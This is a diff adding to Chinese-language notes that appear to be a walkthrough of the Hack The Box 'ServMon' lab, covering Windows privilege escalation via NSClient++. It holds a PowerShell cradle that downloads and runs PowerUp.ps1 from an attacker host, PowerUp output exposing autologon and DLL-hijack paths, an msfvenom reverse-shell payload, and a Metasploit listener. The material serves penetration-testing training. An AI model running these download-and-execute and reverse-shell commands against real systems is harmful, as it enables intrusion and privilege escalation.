@@ -726,9 +726,212 @@ PS C:\Program Files\NSClient++>
 ————————————————————
 ### 安装官方文档
 https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-#### NSClient在NT AUTHORITY\SYSTEM上下文中运行，成功开发后，命令执行将在此上下文中实现。这个漏洞有效的先决条件是服务重新启动。让我们检查一下NSCP服务的权限，看看我们是否有权限重新启动它。这篇由Rohn Edwards撰写的博客文章展示了我们如何获得服务权限PowerShell。我们可以使用Msxml2。xmlhttpcom对象下载摇篮下载和在内存中执行脚本。然而，我们被拒绝访问服务控制管理器，因此我们必须承担服务重新启动
+#### NSClient在NT AUTHORITY\SYSTEM上下文中运行，成功开发后，命令执行将在此上下文中实现。这个漏洞有效的先决条件是服务重新启动。让我们检查一下NSCP服务的权限，看看我们是否有权限重新启动它。这篇由Rohn Edwards撰写的博客文章展示了我们如何获得服务权限PowerShell。我们可以使用Msxml2.xmlhttpcom对象下载摇篮下载和在内存中执行脚本。然而，我们被拒绝访问服务控制管理器，因此我们必须承担服务重新启动
 ```
 nadine@SERVMON C:\Users\Nadine> cmd /c "C:\Program Files\NSClient++\nscp.exe" --
 version
 NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+```
+#### 我们找到了一个非默认应用程序，知道它安装的版本，并且可以以已认证用户的身份访问它。搜索影响此环境的漏洞，发现存在本地权限提升漏洞。成功利用此漏洞后，我们将以哪个用户身份执行代码？
+#### NT AUTHORITY\SYSTEM
+```
+[★]$ git clone https://github.com/PowerShellMafia/PowerSploit.git
+[★]$ cd PowerSploit/Privesc
+[~/PowerSploit/Privesc] [★]$ ls
+Get-System.ps1  PowerUp.ps1  Privesc.psd1  Privesc.psm1  README.md
+[~/PowerSploit/Privesc] [★]$ python3 -m http.server 8011
+
+先把 PowerUp.ps1 传到靶机内存：
+IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.134/PowerUp.ps1")
+然后用：
+方法 1（全面）：
+Invoke-AllChecks
+方法 2（只看服务相关）：
+Get-ModifiableService
+```
+```
+PS C:\ProgramData> powershell wget http://10.10.15.27:8011/PowerUp.ps1 -outfile PowerUp.ps1
+PS C:\ProgramData> . .\PowerUp.ps1
+
+PS C:\ProgramData> Invoke-AllChecks
+Get-WmiObject : Access denied  
+<SNIP>
+ 
+ModifiablePath    : C:\Users\Nadine\AppData\Local\Microsoft\WindowsApps
+IdentityReference : SERVMON\Nadine
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}       
+%PATH%            : C:\Users\Nadine\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\Nadine\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Nadine\AppData\Local\Mic 
+                    rosoft\WindowsApps\wlbsctrl.dll' //某些高权限程序可能会从 PATH 里加载 DLL
+
+DefaultDomainName    : SERVMON
+DefaultUserName      : Nathan
+DefaultPassword      :
+AltDefaultDomainName :
+AltDefaultUserName   :
+AltDefaultPassword   :
+Check                : Registry Autologons
+
+
+
+PS C:\ProgramData> //深挖 Autologon 注册表
+PS C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
+Winlogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon        
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DefaultDomainName    REG_SZ    SERVMON
+    DefaultUserName    REG_SZ    Nathan
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ
+    LegalNoticeText    REG_SZ     
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}   
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x1064398d6
+    ShutdownFlags    REG_DWORD    0x8000022b
+    AutoAdminLogon    REG_DWORD    0x1
+    AutoLogonSID    REG_SZ    S-1-5-21-3217154428-562821044-1828981534-1000     
+    LastUsedUsername    REG_SZ    Nathan
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Alterna
+teShells
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExten
+sions
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDef
+aults
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLog
+onChecked
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Volatil
+eUserMgrKey
+PS C:\ProgramData>
+
+```
+
+```
+[★]$ ssh nadine@10.129.227.77
+nadine@10.129.227.77's password:
+
+
+nadine@SERVMON C:\Users\Nadine> powershell
+PS C:\Users\Nadine> . .\PowerUp.ps1  //同上一样的结果
+```
+#### 直接下载工具，浏览器永久了打不开
+```
+[★]$ git clone https://github.com/GreatSCT/GreatSCT
+[★]$ cd GreatSCT
+[~/GreatSCT][★]$ ls
+CHANGELOG  GreatSCT.py  lib      README.md   setup
+config     __init__.py  LICENSE  ROADMAP.md  Tools
+[~/GreatSCT][★]$ sudo ./GreatSCT.py --ip 10.10.15.27 --port 1234 -t bypass -p regsvcs/meterpreter/rev_tcp.py -o serv
+[★]$ sudo ./setup/setup.sh
+ ==========================================================================
+                  GreatSCT (Setup Script) | [Updated]: 2018-01-21
+ ==========================================================================
+  [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
+ ==========================================================================
+
+Debug:      userhomedir = /root
+Debug:          rootdir = /home/syareya55/GreatSCT
+Debug:         trueuser = root
+Debug: userprimarygroup = root
+Debug:               os = debian
+Debug:          version = "6.4"
+Debug:          winedir = /root/.greatsct
+
+ [ERROR]: GreatSCT is only supported on Debian 8 (Jessie) or higher!
+❌ GreatSCT 太老了（2018 年的工具）
+❌ 它只支持 Debian 8 / Kali 老版本
+你现在的系统是新 Kali / Debian 12
+👉 GreatSCT 已经跑不起来了
+所以这条路：可以放弃 GreatSCT 了 🚫
+```
+```
+[★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.27 LPORT=1234 -f exe -o rev.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+ [★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+```
+
+```
+[★]$ msfconsole
+Metasploit tip: View all productivity tips with the tips command
+                                                  
+                                              `:oDFo:`                            
+                                           ./ymM0dayMmy/.                          
+                                        -+dHJ5aGFyZGVyIQ==+-                    
+                                    `:sm⏣~~Destroy.No.Data~~s:`                
+                                 -+h2~~Maintain.No.Persistence~~h+-              
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
+                      :we're.all.alike'`                     The.PFYroy.No.D7:  
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
+                      :<script>.Ac816/                        sENbove3101.404:    
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
+                      :#OUTHOUSE-  -s:                       /corykennedyData:    
+                      :$nmap -oS                              SSo.6178306Ence:    
+                      :Awsm.da:                            /shMTl#beats3o.No.:    
+                      :Ring0:                             `dDestRoyREXKC3ta/M:    
+                      :23d:                               sSETEC.ASTRONOMYist:    
+                       /-                        /yo-    .ence.N:(){ :|: & };:    
+                                                 `:Shall.We.Play.A.Game?tron/    
+                                                 ```-ooy.if1ghtf0r+ehUser5`    
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
+                                              `MjM~~WE.ARE.se~~MMjMs              
+                                               +~KANSAS.CITY's~-`                  
+                                                J~HAKCERS~./.`                    
+                                                .esc:wq!:`                        
+                                                 +++ATH`                            
+                                                  `
+
+
+       =[ metasploit v6.4.71-dev                          ]
++ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
++ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.15.27
+LHOST => 10.10.15.27
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1234
+LPORT => 1234
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+[*] Started reverse TCP handler on 10.10.15.27:1234
 ```
